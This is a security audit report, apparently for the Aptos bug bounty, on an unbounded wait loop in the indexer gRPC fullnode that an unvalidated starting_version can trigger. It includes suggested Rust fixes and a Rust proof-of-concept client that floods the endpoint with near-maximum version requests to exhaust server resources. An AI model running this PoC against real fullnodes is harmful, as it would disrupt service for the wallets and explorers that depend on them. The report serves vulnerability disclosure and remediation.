# Audit Report

## Title
Resource Exhaustion via Unbounded Loop in Indexer gRPC Transaction Streaming

## Summary
The `get_transactions_from_node()` gRPC endpoint lacks validation on the `starting_version` parameter, allowing attackers to trigger indefinite resource-consuming loops when requesting transaction versions far beyond the current blockchain height. This leads to memory exhaustion and denial of service.

## Finding Description

The vulnerability exists in the indexer gRPC fullnode service's transaction streaming implementation. When a client requests transactions via `get_transactions_from_node()`, the `starting_version` parameter is accepted without validation against the current ledger version. [1](#0-0) 

The server implementation only validates that `starting_version` is not `None`, but does not check if it's within a reasonable range of the actual blockchain height: [2](#0-1) 

When an attacker requests a `starting_version` far beyond the current ledger (e.g., `starting_version = u64::MAX` or `current_ledger_version + 1000000000`), the server spawns a tokio task that enters an indefinite waiting loop: [3](#0-2) 

The spawned task calls `process_next_batch()` which invokes `ensure_highest_known_version()`, a function that loops indefinitely waiting for the requested version to become available: [4](#0-3) 

This loop has **no maximum retry count** and **no timeout**. It only exits if:
1. The requested version becomes available (unlikely if far in the future)
2. The `abort_handle` is triggered (never happens - the abort mechanism is created but never activated in the codebase)
3. An error occurs in `set_highest_known_version()` (but the loop continues on error)

Each malicious request spawns a long-lived task that:
- Loops indefinitely with 100ms sleep intervals
- Allocates a channel, coordinator, and associated resources
- Remains in memory until the server is restarted

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program for the following reasons:

1. **Validator node slowdowns**: Multiple concurrent malicious requests gradually consume server memory and task limits, degrading performance for legitimate requests.

2. **API crashes**: As resources are exhausted, the server may become unresponsive or crash under memory pressure, requiring manual intervention.

3. **Service disruption**: The indexer gRPC service is critical for blockchain explorers, wallets, and other infrastructure components. Its unavailability affects the entire ecosystem.

4. **No authentication required**: If the gRPC endpoint is exposed (typical for public fullnodes), any attacker can exploit this without credentials.

5. **Low attack complexity**: Exploitation requires only sending standard gRPC requests with invalid parameters.

The attack breaks the **Resource Limits** invariant (#9): "All operations must respect gas, storage, and computational limits." The unbounded loop violates this by consuming server resources without limitation.

## Likelihood Explanation

This vulnerability is **highly likely** to be exploited:

- **Easy to discover**: Any attacker monitoring gRPC traffic or reading the proto definitions can identify the parameter.
- **Simple exploitation**: Requires only a gRPC client sending malformed requests.
- **High impact-to-effort ratio**: A single script can send thousands of malicious requests.
- **Public exposure**: Many Aptos fullnodes expose this gRPC endpoint for indexer services.

The attack requires no special privileges, cryptographic operations, or deep protocol knowledge. An attacker needs only:
1. Network access to the gRPC endpoint (typically port 50051)
2. A gRPC client (available in all major languages)
3. Knowledge of the request format

## Recommendation

Implement the following mitigations:

1. **Validate `starting_version` against current ledger height**:
```rust
let starting_version = match r.starting_version {
    Some(version) => {
        let ledger_info = self.service_context.context.get_latest_ledger_info_wrapped()
            .map_err(|e| Status::internal(format!("Failed to get ledger info: {}", e)))?;
        let current_version = ledger_info.ledger_version.0;
        
        // Allow small tolerance for near-future versions, but reject far-future ones
        const MAX_VERSION_AHEAD: u64 = 1000;
        if version > current_version + MAX_VERSION_AHEAD {
            return Err(Status::invalid_argument(
                format!("Starting version {} is too far ahead of current ledger version {}",
                        version, current_version)
            ));
        }
        version
    },
    None => return Err(Status::invalid_argument("Starting version must be set")),
};
```

2. **Add timeout and retry limits to `ensure_highest_known_version()`**:
```rust
async fn ensure_highest_known_version(&mut self) -> bool {
    let mut empty_loops = 0;
    const MAX_RETRIES: u32 = 100; // Exit after ~10 seconds
    
    while self.highest_known_version == 0 || self.current_version > self.highest_known_version {
        if empty_loops >= MAX_RETRIES {
            error!(
                current_version = self.current_version,
                highest_known = self.highest_known_version,
                "[Indexer Fullnode] Timeout waiting for version"
            );
            return false;
        }
        
        if let Some(abort_handle) = self.abort_handle.as_ref() {
            if abort_handle.load(Ordering::SeqCst) {
                return false;
            }
        }
        
        if empty_loops > 0 {
            tokio::time::sleep(Duration::from_millis(RETRY_TIME_MILLIS)).await;
        }
        empty_loops += 1;
        
        if let Err(err) = self.set_highest_known_version() {
            error!(error = format!("{:?}", err), "Failed to set highest known version");
            continue;
        }
    }
    true
}
```

3. **Implement request rate limiting per client IP** at the gRPC server level.

## Proof of Concept

```rust
// PoC: Resource exhaustion via malicious starting_version
// This would be run as a Rust integration test or standalone client

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the fullnode gRPC endpoint
    let mut client = FullnodeDataClient::connect("http://localhost:50051").await?;
    
    // Attack: Send multiple requests with very high starting_version
    let malicious_version = u64::MAX - 1000; // or current_version + 1_000_000_000
    
    for i in 0..100 {
        let request = GetTransactionsFromNodeRequest {
            starting_version: Some(malicious_version + i),
            transactions_count: None, // Infinite stream
        };
        
        // Spawn task to keep connection alive
        let mut client_clone = client.clone();
        tokio::spawn(async move {
            match client_clone.get_transactions_from_node(request).await {
                Ok(mut stream) => {
                    // Keep stream open to prevent early cleanup
                    while let Ok(Some(_)) = stream.get_mut().message().await {
                        // This will hang indefinitely
                    }
                }
                Err(e) => println!("Request {} failed: {}", i, e),
            }
        });
    }
    
    // Wait for attack to take effect
    tokio::time::sleep(tokio::time::Duration::from_secs(300)).await;
    
    println!("Attack complete - server should be experiencing resource exhaustion");
    Ok(())
}
```

**Expected outcome**: After sending 100+ requests with invalid `starting_version` values, the server will have 100+ tasks spinning in `ensure_highest_known_version()` loops, consuming memory and eventually degrading performance or crashing.

## Notes

This vulnerability is particularly concerning because:
- The indexer gRPC service is a critical component of the Aptos ecosystem
- Public fullnodes typically expose this endpoint without authentication
- The attack is sustainable (attacker can continue sending requests)
- Recovery requires server restart, causing service disruption
- The HTTP/2 keepalive settings don't prevent this attack since the tasks are actively looping

The vulnerability exists because the original design assumed streaming mode would be used only with reasonable `starting_version` values, but lacks defensive validation against malicious inputs.

### Citations

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L67-76)
```rust
pub struct GetTransactionsFromNodeRequest {
    /// Required; start version of current stream.
    /// If not set will panic somewhere
    #[prost(uint64, optional, tag="1")]
    pub starting_version: ::core::option::Option<u64>,
    /// Optional; number of transactions to return in current stream.
    /// If not set, response streams infinitely.
    #[prost(uint64, optional, tag="2")]
    pub transactions_count: ::core::option::Option<u64>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L73-78)
```rust
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-117)
```rust
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L550-579)
```rust
    async fn ensure_highest_known_version(&mut self) -> bool {
        let mut empty_loops = 0;
        while self.highest_known_version == 0 || self.current_version > self.highest_known_version {
            if let Some(abort_handle) = self.abort_handle.as_ref() {
                if abort_handle.load(Ordering::SeqCst) {
                    return false;
                }
            }
            if empty_loops > 0 {
                tokio::time::sleep(Duration::from_millis(RETRY_TIME_MILLIS)).await;
            }
            empty_loops += 1;
            if let Err(err) = self.set_highest_known_version() {
                error!(
                    error = format!("{:?}", err),
                    "[Indexer Fullnode] Failed to set highest known version"
                );
                continue;
            } else {
                sample!(
                    SampleRate::Frequency(10),
                    info!(
                        highest_known_version = self.highest_known_version,
                        "[Indexer Fullnode] Found new highest known version",
                    )
                );
            }
        }
        true
    }
```
